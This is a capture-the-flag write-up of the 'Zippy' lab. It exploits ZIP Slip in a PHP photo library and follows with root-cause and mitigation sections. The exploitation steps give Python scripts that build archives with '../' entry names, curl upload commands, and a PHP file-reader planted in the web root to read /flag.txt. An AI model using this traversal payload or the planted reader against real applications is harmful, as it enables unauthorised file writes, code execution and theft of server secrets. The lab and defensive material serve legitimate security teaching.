---
title: "ZIP Slip Leads to Arbitrary File Write | Zippy"
date: 2026-07-21 13:55:00 +0530
categories: [A01 - Broken Access Control, Path Traversal]
tags: [zip-slip, path-traversal, arbitrary-file-write, file-upload, php, webverse-pro, ctf]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/zippy-zip-slip.webp
  alt: Zippy ZIP Slip vulnerability in a photo library backup restore feature
---

## Lab Link

[Zippy](https://dashboard.webverselabs-pro.com/mystery-challenges/zippy)

## Overview

**Zippy** was a web security challenge built around **Shoebox**, a small self-hosted PHP photo library. The application allowed users to add individual images or restore an entire album from a ZIP backup.

The album restoration feature extracted archive entries without safely validating their destination paths. By placing directory traversal sequences such as `../` inside a ZIP entry name, it was possible to escape the intended extraction directory.

This **ZIP Slip** vulnerability first enabled arbitrary file placement and was then escalated into server-side PHP execution by writing a PHP file into the web document root. The uploaded script was used to read the challenge flag from the filesystem.

## Objective

The objective was to identify the vulnerability in the application and retrieve the flag stored on the server.

## Vulnerability Identification

The application exposed an unauthenticated import page:

```text
/import.php
```

The page offered two upload options:

1. Upload a single image.
2. Restore an album from a `.zip` backup.

The album restoration form used a multipart request containing the following fields:

```text
action=album
album=<ZIP file>
```

The application stated that the folder structure inside the archive would be preserved. This suggested that filenames and paths from the ZIP archive were being used directly during extraction.

If archive entry paths are not normalized and checked, an attacker can include entries such as:

```text
../file.txt
../../file.txt
../../../var/www/html/file.php
```

These traversal sequences can cause extracted files to be written outside the intended directory.

## Recon and Approach

The application was first mapped to identify the relevant routes and upload behavior.

The primary attack surface was the album restoration form on `/import.php`. It accepted ZIP archives without authentication, and a successful upload returned a message similar to:

```text
Restored 1 file(s).
```

A harmless proof-of-concept archive was created before attempting code execution. The ZIP contained a marker file with a traversal path:

```text
../zippy_poc.txt
```

After uploading the archive, the marker appeared outside the expected extraction folder. This confirmed that the ZIP extractor trusted attacker-controlled archive paths.

The observed directory relationship was approximately:

```text
/library/imports/   Intended extraction directory
/library/           Traversal destination using ../
```

This proved that the restore feature was vulnerable to ZIP Slip.

## Exploitation

### Step 1: Create a Harmless Traversal Archive

A simple ZIP archive can be produced with Python while explicitly controlling the entry name:

```python
import zipfile

with zipfile.ZipFile("zippy_poc.zip", "w") as archive:
    archive.writestr("../zippy_poc.txt", "ZIP Slip confirmed")
```

The important detail is that the archive entry is named `../zippy_poc.txt`, even though the local ZIP file itself is harmless.

### Step 2: Upload the Archive

The crafted archive was submitted to the album restoration endpoint:

```bash
curl -sS \
  -F "action=album" \
  -F "album=@zippy_poc.zip;type=application/zip" \
  "https://<REDACTED-HOST>/import.php"
```

The application accepted the archive and reported that one file had been restored.

The marker file became accessible outside the intended `/library/imports/` directory, confirming path traversal during extraction.

### Step 3: Determine the Required Traversal Depth

A second archive containing several harmless text files at different traversal depths was used to determine where files were written:

```python
import zipfile

entries = {
    "../depth-one.txt": "one",
    "../../depth-two.txt": "two",
    "../../../depth-three.txt": "three",
}

with zipfile.ZipFile("depth-probe.zip", "w") as archive:
    for name, data in entries.items():
        archive.writestr(name, data)
```

Each possible destination was then requested through the web server. This showed that traversal could reach the application's document root.

### Step 4: Write a PHP File to the Document Root

After confirming the correct traversal depth, a minimal PHP file reader was placed in the document root.

```php
<?php
$path = $_GET['f'] ?? '';
if ($path !== '') {
    readfile($path);
}
?>
```

The ZIP entry name used directory traversal so that the file would be extracted into a web-executable location:

```python
import zipfile

php = """<?php
$path = $_GET['f'] ?? '';
if ($path !== '') {
    readfile($path);
}
?>"""

with zipfile.ZipFile("reader.zip", "w") as archive:
    archive.writestr("../../flag-reader.php", php)
```

> The exact traversal depth depends on the server's extraction directory. It should be established with harmless marker files before placing executable content.

### Step 5: Upload the Reader

```bash
curl -sS \
  -F "action=album" \
  -F "album=@reader.zip;type=application/zip" \
  "https://<REDACTED-HOST>/import.php"
```

The server extracted the PHP file into the web document root.

### Step 6: Read the Flag

The uploaded reader was invoked with the common challenge flag path:

```bash
curl -sS \
  "https://<REDACTED-HOST>/flag-reader.php?f=/flag.txt"
```

The response returned the contents of `/flag.txt`.

## Proof and Flag

The vulnerability chain was successfully demonstrated:

```text
Unauthenticated ZIP upload
        ↓
Unsafe archive extraction
        ↓
Directory traversal outside the import folder
        ↓
Arbitrary PHP file written to the document root
        ↓
Server-side PHP execution
        ↓
Read access to /flag.txt
```

The recovered flag is intentionally redacted:

```text
WEBVERSE{REDACTED}
```

After validating the challenge, the temporary reader was overwritten or disabled so that a reusable file-read endpoint was not left on the instance.

## Root Cause

The root cause was unsafe extraction of attacker-controlled ZIP archives.

The application preserved archive paths but failed to verify that each resolved destination remained inside the intended import directory. A vulnerable extraction flow often resembles:

```php
$zip->extractTo($destination);
```

Calling a general extraction method on an untrusted archive can be unsafe when the library or surrounding application does not reject traversal paths.

The application should have validated every entry after path normalization:

```text
destination/
destination/photo.jpg          Allowed
destination/album/photo.jpg    Allowed
destination/../shell.php       Blocked
../../shell.php                Blocked
/var/www/html/shell.php        Blocked
```

The extraction destination was also close enough to the web root that traversal could place executable PHP files in a server-executable directory. This converted a path traversal issue into arbitrary file write and remote code execution.

## Impact

An attacker could potentially:

- Write files outside the intended album import directory.
- Replace application files writable by the web-server account.
- Place executable server-side scripts in the document root.
- Read sensitive local files through an uploaded script.
- Access configuration files, secrets, or database credentials.
- Modify application behavior or establish persistence.
- Achieve remote code execution with the privileges of the web server.

Because the upload endpoint required no authentication, the attack surface was available to any remote user who could access the application.

## Mitigation

### Validate Every ZIP Entry

Before extraction, calculate the canonical destination of each archive entry and confirm that it remains inside the approved directory.

```php
<?php

$baseDirectory = realpath('/var/www/data/imports');

for ($i = 0; $i < $zip->numFiles; $i++) {
    $entry = $zip->getNameIndex($i);

    if (
        str_contains($entry, "\0") ||
        str_starts_with($entry, '/') ||
        str_starts_with($entry, '\\') ||
        preg_match('/^[A-Za-z]:[\/\\\\]/', $entry)
    ) {
        throw new RuntimeException('Unsafe archive entry');
    }

    $normalized = str_replace('\\', '/', $entry);
    $parts = [];

    foreach (explode('/', $normalized) as $part) {
        if ($part === '' || $part === '.') {
            continue;
        }

        if ($part === '..') {
            throw new RuntimeException('Path traversal detected');
        }

        $parts[] = $part;
    }

    $relativePath = implode(DIRECTORY_SEPARATOR, $parts);
    $target = $baseDirectory . DIRECTORY_SEPARATOR . $relativePath;

    if (!str_starts_with($target, $baseDirectory . DIRECTORY_SEPARATOR)) {
        throw new RuntimeException('Extraction escaped destination');
    }
}
```

### Extract Outside the Web Root

User-controlled files should be stored in a non-executable directory outside the document root.

For example:

```text
/var/www/html/           Application code
/var/www/user-uploads/   Unsafe design
/srv/shoebox/uploads/    Safer upload storage
```

### Disable Script Execution in Upload Directories

The web server should never execute uploaded files as PHP, CGI, or another server-side language.

For Apache, PHP execution can be disabled for an upload directory:

```apache
<Directory "/srv/shoebox/uploads">
    php_admin_flag engine off
    Options -ExecCGI
    AllowOverride None
</Directory>
```

### Enforce an Archive Allowlist

Only expected image formats should be accepted after inspecting their actual content:

```text
.jpg
.jpeg
.png
.gif
.webp
```

Reject scripts, symbolic links, device files, and unexpected archive metadata.

### Apply Resource Limits

Archive processing should enforce limits on:

- Total uncompressed size.
- Number of archive entries.
- Maximum file size.
- Directory nesting depth.
- Compression ratio.
- Processing time.

These checks also reduce the risk of ZIP bombs and resource exhaustion.

### Require Authentication and CSRF Protection

Administrative restore functionality should require an authenticated and authorized account. State-changing upload forms should also use CSRF protection.

Authentication would not fix ZIP Slip itself, but it would substantially reduce exposure.

### Use Least Privilege

The web-server account should not have permission to modify application source files or write to the document root. Upload processing can also be isolated in a restricted container or sandbox.

## Lessons Learned

- ZIP files contain attacker-controlled paths, not just file contents.
- A successful upload message does not mean files were written only to the intended location.
- Harmless marker files are useful for measuring traversal depth safely.
- Uploading outside the web root does not automatically prevent exploitation if traversal can reach executable directories.
- File extension restrictions in one folder are ineffective when an attacker can choose another extraction destination.
- Arbitrary file write often becomes remote code execution when a writable, web-executable directory is reachable.
- Temporary exploitation artifacts should be removed or disabled after verification.
